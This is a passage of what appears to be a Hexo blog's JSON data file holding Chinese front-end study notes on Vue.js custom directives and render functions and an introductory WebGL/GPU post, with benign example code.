class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;);</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.使用Render改写后</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">ele</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">ele</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;ele&#x27;</span>, &#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">render</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">createElement</span>) &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">createElement</span>(</span><br><span class=\"language-javascript\">                <span class=\"hljs-string\">&#x27;div&#x27;</span>,</span><br><span class=\"language-javascript\">                &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-attr\">class</span>: &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-string\">&#x27;show&#x27;</span>: <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">show</span></span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    <span class=\"hljs-attr\">attrs</span>: &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-string\">&#x27;element&#x27;</span></span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    <span class=\"hljs-attr\">on</span>: &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">click</span>: <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">handleClick</span></span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">                <span class=\"hljs-string\">&#x27;文本内容1&#x27;</span></span><br><span class=\"language-javascript\">            )</span><br><span class=\"language-javascript\">        &#125;,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-keyword\">return</span> &#123; <span class=\"hljs-attr\">show</span>: <span class=\"hljs-literal\">true</span> &#125;</span><br><span class=\"language-javascript\">        &#125;,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">handleClick</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;click&#x27;</span>);</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;);</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>3，就此例而言，render得写法复杂于template写法，所以在合适的场景使用render</p>\n<p>4.约束：所有的组件树中，如果VNODE是组件或者含有slot，那么Vnode必须唯一</p>\n<p>5.render函数里创建了一个cloneVNode得工厂函数，通过递归将slot所有子节点克隆一份，并对VNode的关键属性也复制了一份；</p>\n<h3 id=\"三、函数化组件\"><a href=\"#三、函数化组件\" class=\"headerlink\" title=\"三、函数化组件\"></a>三、函数化组件</h3><p>​    1.vue提供了一个functional的布尔值选项，设置为true可以使组件无状态和无实例，也就没有data和this上下文；render返回虚拟节点也更加容易渲染；</p>\n<p>​    2.函数化组件得是适用场景：</p>\n<ul>\n<li>程序化得在多个组件中选择一个</li>\n<li>在将children，props，data传递给子组件之前操作他们；</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch8-自定义命令\"><a href=\"#Ch8-自定义命令\" class=\"headerlink\" title=\"Ch8 自定义命令\"></a>Ch8 自定义命令</h1><h3 id=\"一、基本用法\"><a href=\"#一、基本用法\" class=\"headerlink\" title=\"一、基本用法\"></a>一、基本用法</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//全局注册</span><br><br>    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">directive</span>(<span class=\"hljs-string\">&#x27;focus&#x27;</span>,&#123;<br>            <span class=\"hljs-comment\">//指令选项</span><br>        &#125;)<br><span class=\"hljs-comment\">//局部注册，作用域在app内</span><br>        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;<br>            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,<br>            <span class=\"hljs-attr\">directives</span>:&#123;<br>                <span class=\"hljs-attr\">focus</span>:&#123;<br>                    <span class=\"hljs-comment\">//指令选项</span><br>                &#125;<br>            &#125;<br>        &#125;)<br></code></pre></td></tr></table></figure>\n\n<ol>\n<li>bind：第一次绑定到元素时使用；</li>\n<li>inserted：被绑定元素插入父节点时使用；</li>\n<li>update：绑定元素模板更新时使用，不论绑定值是否发生变化；</li>\n<li>componentUpdated：被绑定元素完成一次更新周期时使用；</li>\n<li>unbind： 指令与元素解绑时调用；</li>\n</ol>\n<h3 id=\"二、实战\"><a href=\"#二、实战\" class=\"headerlink\" title=\"二、实战\"></a>二、实战</h3><p>代码已经存在电脑</p>\n<h1 id=\"Ch9-Render函数\"><a href=\"#Ch9-Render函数\" class=\"headerlink\" title=\"Ch9 Render函数\"></a>Ch9 Render函数</h1><h3 id=\"一、Virtual-Dom：一个JavaScript对象，在状态发生变化时，Virtual-Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\"><a href=\"#一、Virtual-Dom：一个JavaScript对象，在状态发生变化时，Virtual-Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\" class=\"headerlink\" title=\"一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；\"></a>一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> vNode=&#123;<br>    <span class=\"hljs-attr\">tag</span>:<span class=\"hljs-string\">&#x27;div&#x27;</span>,<br>    <span class=\"hljs-attr\">attributes</span>:&#123;<br>        <span class=\"hljs-attr\">id</span>:<span class=\"hljs-string\">&#x27;main&#x27;</span><br>    &#125;,<br>    <span class=\"hljs-attr\">children</span>:[<br>        <span class=\"hljs-comment\">//p节点</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>1.vNode分类：</p>\n<table>\n<thead>\n<tr>\n<th>Node</th>\n<th>Function</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ElementVnode</td>\n<td>普通元素节点</td>\n</tr>\n<tr>\n<td>TextVNode</td>\n<td>文本节点</td>\n</tr>\n<tr>\n<td>ComponentVNode</td>\n<td>组件节点</td>\n</tr>\n<tr>\n<td>EmptyVNode</td>\n<td>无内容的注释节点</td>\n</tr>\n<tr>\n<td>CloneVNode</td>\n<td>克隆节点</td>\n</tr>\n</tbody></table>\n<h3 id=\"二、createElement用法\"><a href=\"#二、createElement用法\" class=\"headerlink\" title=\"二、createElement用法\"></a>二、createElement用法</h3><p>1.传统方法：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">ele</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">ele</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;ele&#x27;</span>, &#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">&#x27; &lt;div id=&quot;element&quot; :class=&quot;&#123;show:show&#125;&quot; @click=&quot;handleClick&quot;&gt;元素内容&lt;/div&gt;&#x27;</span>,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-keyword\">return</span> &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">show</span>: <span class=\"hljs-literal\">true</span></span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">handleClick</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;clock&#x27;</span>);</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;);</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>2.使用Render改写后</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">ele</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">ele</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;ele&#x27;</span>, &#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">render</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">createElement</span>) &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">createElement</span>(</span><br><span class=\"language-javascript\">                <span class=\"hljs-string\">&#x27;div&#x27;</span>,</span><br><span class=\"language-javascript\">                &#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-attr\">class</span>: &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-string\">&#x27;show&#x27;</span>: <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">show</span></span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    <span class=\"hljs-attr\">attrs</span>: &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">id</span>: <span class=\"hljs-string\">&#x27;element&#x27;</span></span><br><span class=\"language-javascript\">                    &#125;,</span><br><span class=\"language-javascript\">                    <span class=\"hljs-attr\">on</span>: &#123;</span><br><span class=\"language-javascript\">                        <span class=\"hljs-attr\">click</span>: <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">handleClick</span></span><br><span class=\"language-javascript\">                    &#125;</span><br><span class=\"language-javascript\">                &#125;,</span><br><span class=\"language-javascript\">                <span class=\"hljs-string\">&#x27;文本内容1&#x27;</span></span><br><span class=\"language-javascript\">            )</span><br><span class=\"language-javascript\">        &#125;,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">data</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-keyword\">return</span> &#123; <span class=\"hljs-attr\">show</span>: <span class=\"hljs-literal\">true</span> &#125;</span><br><span class=\"language-javascript\">        &#125;,</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">methods</span>: &#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">handleClick</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;click&#x27;</span>);</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;</span><br><span class=\"language-javascript\">    &#125;);</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">    <span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">        <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">    &#125;)</span><br><span class=\"language-javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>3，就此例而言，render得写法复杂于template写法，所以在合适的场景使用render</p>\n<p>4.约束：所有的组件树中，如果VNODE是组件或者含有slot，那么Vnode必须唯一</p>\n<p>5.render函数里创建了一个cloneVNode得工厂函数，通过递归将slot所有子节点克隆一份，并对VNode的关键属性也复制了一份；</p>\n<h3 id=\"三、函数化组件\"><a href=\"#三、函数化组件\" class=\"headerlink\" title=\"三、函数化组件\"></a>三、函数化组件</h3><p>​    1.vue提供了一个functional的布尔值选项，设置为true可以使组件无状态和无实例，也就没有data和this上下文；render返回虚拟节点也更加容易渲染；</p>\n<p>​    2.函数化组件得是适用场景：</p>\n<ul>\n<li>程序化得在多个组件中选择一个</li>\n<li>在将children，props，data传递给子组件之前操作他们；</li>\n</ul>\n"},{"title":"WebGL","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg2.jpg","_content":"\n\n# WebGL\n\n## 一、Why WebGL？Why GPU？\n\n```\nGPU!=WebGL!=3D\n```\n\n### 1.现代图形系统\n\n- 光栅（Raster）：几乎所有的现代图形系统都是基于光栅来绘制图形的，光栅就是指构成图像的像素阵列；\n- 像素：一个像素对应图像的一个带你，通常保存图像的某个具体位置的颜色信息等；\n- 帧缓存（Frame Buffer）：绘图过程中，像素信息存放在帧缓存中，是一块内存地址；\n\n##### 具体步骤\n\n- 轮廓提取/ meshing\n- 光栅化\n- 帧缓存\n- 渲染\n\n![](https://s3.bmp.ovh/imgs/2023/02/14/57143b0a02e56c3d.jpg)\n\n\n$$\nData->Processor->Frame Buffer->Pixel\n$$\nGPU由大量小的运算单元构成，每个运算单元只负责很简单的计算；计算单元相互独立，因此可以并行计算；\n\n### 2.WebGL\n\n$$\nOpenGL----js接口---->WebGL\n$$\n\n##### WebGL代码流程\n\n- 创建WebGL上下文\n- 创建WebGL Program\n- 将数据存入缓冲区\n- 将缓冲区数据读取到GPU\n- GPU执行WebGL程序，输出结果\n\n![](https://s3.bmp.ovh/imgs/2023/02/14/204b3600bac6924e.jpg)\n\n```js\n//define shaders\n\n//create program\n\n//set points\n//中心点是坐标原点（0，0）\n\n//create & build Buffer\n\n//Frame Buffer to GPU\n\n//output\n```\n\n\n\n\n\n\n\n\n\n","source":"_posts/WebGL月影带练.md","raw":"---\ntitle: WebGL\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 可视化\n    - 笔记\nmp3: \ncover: img/bg2.jpg\n---\n\n\n# WebGL\n\n## 一、Why WebGL？Why GPU？\n\n```\nGPU!=WebGL!=3D\n```\n\n### 1.现代图形系统\n\n- 光栅（Raster）：几乎所有的现代图形系统都是基于光栅来绘制图形的，光栅就是指构成图像的像素阵列；\n- 像素：一个像素对应图像的一个带你，通常保存图像的某个具体位置的颜色信息等；\n- 帧缓存（Frame Buffer）：绘图过程中，像素信息存放在帧缓存中，是一块内存地址；\n\n##### 具体步骤\n\n- 轮廓提取/ meshing\n- 光栅化\n- 帧缓存\n- 渲染\n\n![](https://s3.bmp.ovh/imgs/2023/02/14/57143b0a02e56c3d.jpg)\n\n\n$$\nData->Processor->Frame Buffer->Pixel\n$$\nGPU由大量小的运算单元构成，每个运算单元只负责很简单的计算；计算单元相互独立，因此可以并行计算；\n\n### 2.WebGL\n\n$$\nOpenGL----js接口---->WebGL\n$$\n\n##### WebGL代码流程\n\n- 创建WebGL上下文\n- 创建WebGL Program\n- 将数据存入缓冲区\n- 将缓冲区数据读取到GPU\n- GPU执行WebGL程序，输出结果\n\n![](https://s3.bmp.ovh/imgs/2023/02/14/204b3600bac6924e.jpg)\n\n```js\n//define shaders\n\n//create program\n\n//set points\n//中心点是坐标原点（0，0）\n\n//create & build Buffer\n\n//Frame Buffer to GPU\n\n//output\n```\n\n\n\n\n\n\n\n\n\n","slug":"WebGL月影带练","published":1,"updated":"2023-03-27T11:01:29.588Z","_id":"clg29vyhp004iao9c0c3wgdad","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"WebGL\"><a href=\"#WebGL\" class=\"headerlink\" title=\"WebGL\"></a>WebGL</h1><h2 id=\"一、Why-WebGL？Why-GPU？\"><a href=\"#一、Why-WebGL？Why-GPU？\" class=\"headerlink\" title=\"一、Why WebGL？Why GPU？\"></a>一、Why WebGL？Why GPU？</h2><figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs erlang-repl\">GPU!=WebGL!=<span class=\"hljs-number\">3</span>D<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"1-现代图形系统\"><a href=\"#1-现代图形系统\" class=\"headerlink\" title=\"1.现代图形系统\"></a>1.现代图形系统</h3><ul>\n<li>光栅（Raster）：几乎所有的现代图形系统都是基于光栅来绘制图形的，光栅就是指构成图像的像素阵列；</li>\n<li>像素：一个像素对应图像的一个带你，通常保存图像的某个具体位置的颜色信息等；</li>\n<li>帧缓存（Frame Buffer）：绘图过程中，像素信息存放在帧缓存中，是一块内存地址；</li>\n</ul>\n<h5 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h5><ul>\n<li>轮廓提取/ meshing</li>\n<li>光栅化</li>\n<li>帧缓存</li>\n<li>渲染</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/14/57143b0a02e56c3d.jpg\"></p>\n<p>$$<br>Data-&gt;Processor-&gt;Frame Buffer-&gt;Pixel<br>$$<br>GPU由大量小的运算单元构成，每个运算单元只负责很简单的计算；计算单元相互独立，因此可以并行计算；</p>\n<h3 id=\"2-WebGL\"><a href=\"#2-WebGL\" class=\"headerlink\" title=\"2.WebGL\"></a>2.WebGL</h3><p>$$<br>OpenGL—-js接口—-&gt;WebGL<br>$$</p>\n<h5 id=\"WebGL代码流程\"><a href=\"#WebGL代码流程\" class=\"headerlink\" title=\"WebGL代码流程\"></a>WebGL代码流程</h5><ul>\n<li>创建WebGL上下文</li>\n<li>创建WebGL Program</li>\n<li>将数据存入缓冲区</li>\n<li>将缓冲区数据读取到GPU</li>\n<li>GPU执行WebGL程序，输出结果</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/14/204b3600bac6924e.jpg\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//define shaders</span><br><br><span class=\"hljs-comment\">//create program</span><br><br><span class=\"hljs-comment\">//set points</span><br><span class=\"hljs-comment\">//中心点是坐标原点（0，0）</span><br><br><span class=\"hljs-comment\">//create &amp; build Buffer</span><br><br><span class=\"hljs-comment\">//Frame Buffer to GPU</span><br><br><span class=\"hljs-comment\">//output</span><br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"WebGL\"><a href=\"#WebGL\" class=\"headerlink\" title=\"WebGL\"></a>WebGL</h1><h2 id=\"一、Why-WebGL？Why-GPU？\"><a href=\"#一、Why-WebGL？Why-GPU？\" class=\"headerlink\" title=\"一、Why WebGL？Why GPU？\"></a>一、Why WebGL？Why GPU？</h2><figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs erlang-repl\">GPU!=WebGL!=<span class=\"hljs-number\">3</span>D<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"1-现代图形系统\"><a href=\"#1-现代图形系统\" class=\"headerlink\" title=\"1.现代图形系统\"></a>1.现代图形系统</h3><ul>\n<li>光栅（Raster）：几乎所有的现代图形系统都是基于光栅来绘制图形的，光栅就是指构成图像的像素阵列；</li>\n<li>像素：一个像素对应图像的一个带你，通常保存图像的某个具体位置的颜色信息等；</li>\n<li>帧缓存（Frame Buffer）：绘图过程中，像素信息存放在帧缓存中，是一块内存地址；</li>\n</ul>\n<h5 id=\"具体步骤\"><a href=\"#具体步骤\" class=\"headerlink\" title=\"具体步骤\"></a>具体步骤</h5><ul>\n<li>轮廓提取/ meshing</li>\n<li>光栅化</li>\n<li>帧缓存</li>\n<li>渲染</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/14/57143b0a02e56c3d.jpg\"></p>\n<p>$$<br>Data-&gt;Processor-&gt;Frame Buffer-&gt;Pixel<br>$$<br>GPU由大量小的运算单元构成，每个运算单元只负责很简单的计算；计算单元相互独立，因此可以并行计算；</p>\n<h3 id=\"2-WebGL\"><a href=\"#2-WebGL\" class=\"headerlink\" title=\"2.WebGL\"></a>2.WebGL</h3><p>$$<br>OpenGL—-js接口—-&gt;WebGL<br>$$</p>\n<h5 id=\"WebGL代码流程\"><a href=\"#WebGL代码流程\" class=\"headerlink\" title=\"WebGL代码流程\"></a>WebGL代码流程</h5><ul>\n<li>创建WebGL上下文</li>\n<li>创建WebGL Program</li>\n<li>将数据存入缓冲区</li>\n<li>将缓冲区数据读取到GPU</li>\n<li>GPU执行WebGL程序，输出结果</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/14/204b3600bac6924e.jpg\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//define shaders</span><br><br><span class=\"hljs-comment\">//create program</span><br><br><span class=\"hljs-comment\">//set points</span><br><span class=\"hljs-comment\">//中心点是坐标原点（0，0）</span><br><br><span class=\"hljs-comment\">//create &amp; build Buffer</span><br><br><span class=\"hljs-comment\">//Frame Buffer to GPU</span><br><br><span class=\"hljs-comment\">//output</span><br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n"},{"title":"Autumn_XDU","date":"2021-08-08T16:00:46.000Z","mp3":null,"cover":"img/xdu.jpg","_content":"\n\n## XDU的秋天\n\n> 呜呜呜,XD的秋天也太好看了吧~~\n> 